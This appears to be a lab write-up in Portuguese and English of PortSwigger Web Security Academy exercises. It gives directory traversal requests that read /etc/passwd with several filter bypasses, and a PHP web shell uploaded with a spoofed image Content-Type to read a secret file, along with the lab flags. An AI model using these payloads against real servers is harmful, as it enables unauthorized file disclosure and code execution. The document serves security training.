# Exercises

## Directory traversal

### >> 1. File path traversal, simple case
Crie uma requisição GET contendo o caminho do arquivo a ser lido
````http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: ac611f7c1ebca4cec0b52379003e009f.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 2. File path traversal, traversal sequences blocked with absolute path bypass
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````
GET /image?filename=/etc/passwd HTTP/1.1
Host: ac601f011f09bc6dc05120b5004a00fa.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 3. File path traversal, traversal sequences stripped non-recursively
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````
GET /image?filename=....//....//....//....//etc//passwd HTTP/1.1
Host: acb91f041e530947c0f6088a004200cf.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````



## File upload vulnerabilities 

### >> 1. Remote code execution via web shell upload
Crie um arqvuio com o conteudo:
````php
 <?php echo file_get_contents('/home/carlos/secret'); ?> 
````
Submeta o arquivo via upload de imagens e acesse o arquivo submetido através do link informado.

`Flag: 0sehBXVzLAZHtNFAuMJmIlFDR3UGAx5s`

### >> 2. Web shell upload via Content-Type restriction bypass
Crie um arqvuio com o conteudo:
````php
 <?php echo file_get_contents('/home/carlos/secret'); ?> 
````
Submeta o arquivo via upload de imagens 

Encaminhe a request para repeater e altera o header de:

````http
------WebKitFormBoundarySAtt4ZPtNsBRhSWY
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: application/octet-stream

 <?php echo file_get_contents('/home/carlos/secret'); ?> 
````

````http
------WebKitFormBoundarySAtt4ZPtNsBRhSWY
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: image/jpeg

 <?php echo file_get_contents('/home/carlos/secret'); ?> 
````

e acesse o arquivo submetido através do link informado.

`Flag: iiVfQK3LlDuvm0uskl9M2nHoeSEX4JrA`

### >> 3.
